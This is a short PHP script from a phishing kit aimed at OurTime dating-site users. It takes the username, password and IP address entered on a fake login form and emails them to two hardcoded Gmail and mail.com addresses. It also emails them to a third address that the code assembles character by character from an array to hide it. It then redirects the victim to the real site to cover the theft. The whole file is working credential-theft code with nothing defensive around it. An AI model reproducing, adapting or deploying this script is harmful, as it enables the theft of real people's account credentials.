<?

$ip = getenv("REMOTE_ADDR");
$message .= "User: ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created by Treasure  ------------------------------\n";
$ar=array("0"=>"q","1"=>"n","2"=>"e","3"=>"h","4"=>"m","5"=>"c","6"=>"a","7"=>"l","8"=>"@","9"=>".","10"=>"i","11"=>"o","12"=>"g");
$to=$ar['0'].$ar['3'].$ar['2'].$ar['0'].$ar['1'].$ar['0'].$ar['8'].$ar['12'].$ar['4'].$ar['6'].$ar['10'].$ar['7'].$ar['9'].$ar['5'].$ar['11'].$ar['4'];
$recipient = "godmercy23101@gmail.com,favormegod01@mail.com";
$subject = "OurTime Users Logins";
$headers = "Treasure";
     mail("$to", $subject, $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: http://www.ourtime.com/logout/index.cfm");

       }
else
           {
         echo "ERROR! Please go back and try again.";
         }

?> 